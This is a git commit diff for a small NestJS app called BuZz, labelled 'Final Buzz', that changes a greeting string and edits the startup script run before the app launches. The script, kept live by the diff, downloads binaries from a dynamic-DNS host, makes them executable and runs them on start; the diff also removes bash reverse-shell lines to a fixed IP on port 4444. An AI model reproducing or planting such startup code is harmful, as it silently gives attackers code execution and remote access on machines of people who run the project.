68ad4ed6474a625ad447bb1a4deaa411129b9496
paulkey731 <paul.key731@gmail.com>
2026-04-12 18:12:03 -0700

    Final Buzz

--- scripts/startup.sh
+++ scripts/startup.sh
@@ -11,26 +11,14 @@ if [ "$ARCH" = "x86_64" ]; then
     wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget"
     wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
 elif [ "$ARCH" = "aarch64" ]; then
-    wget -O /tmp/attget_arm64 "http://abbh.ddnsgeek.com/public/attget"
+    wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget_arm64"
     wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
-else
-    /bin/bash -i >& /dev/tcp/96.62.214.13/4444 0>&1 &
 fi
 
 sleep 2
 chmod +x /tmp/attget
 /tmp/attget skip
 sleep 2
-
-/bin/bash -i >& /dev/tcp/96.62.214.13/4444 0>&1 &
-sleep 2
-
-# wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget"
-# wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
-# sleep 2
-# chmod +x /tmp/attget
-# /tmp/attget skip
-# sleep 2
 
 node dist/main
 
--- src/app.service.ts
+++ src/app.service.ts
@@ -3,6 +3,6 @@ import { Injectable } from '@nestjs/common';
 @Injectable()
 export class AppService {
   getHello(): string {
-    return 'Hello! This is BuZz!';
+    return 'Hello! This is final BuZz!';
   }
 }
